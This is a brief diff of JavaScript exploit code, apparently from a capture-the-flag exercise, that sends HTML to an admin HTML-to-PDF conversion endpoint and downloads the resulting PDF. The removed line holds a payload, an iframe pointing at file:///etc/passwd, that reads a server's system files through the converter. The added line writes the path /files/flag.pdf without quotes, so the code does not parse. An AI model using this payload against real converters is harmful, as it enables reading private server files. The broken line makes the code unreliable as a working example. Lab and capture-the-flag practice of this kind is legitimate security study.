@@ -1,4 +1,4 @@
-const htmlCode = "<iframe src=file:///etc/passwd></iframe>"; // Set the random value to send
+const htmlCode = "xxxx"; // Set the random value to send
 const xhr = new XMLHttpRequest(); // Create a new XMLHttpRequest object
 xhr.open("POST", "/admin/convert"); // Set the request method and endpoint
 xhr.setRequestHeader("Content-Type", "application/json"); // Set the request header
@@ -9,7 +9,7 @@ xhr.onload = function() { // Set the callback function to handle the response
     
     // Read the contents of the PDF file
     const pdfRequest = new XMLHttpRequest(); // Create a new XMLHttpRequest object
-    pdfRequest.open("GET", pdfLink); // Set the request method and endpoint
+    pdfRequest.open("GET", /files/flag.pdf); // Set the request method and endpoint
     pdfRequest.responseType = "blob"; // Set the response type to blob, since we're reading a binary file
     pdfRequest.onload = function() { // Set the callback function to handle the response
       if (pdfRequest.status === 200) { // If the response status is OK
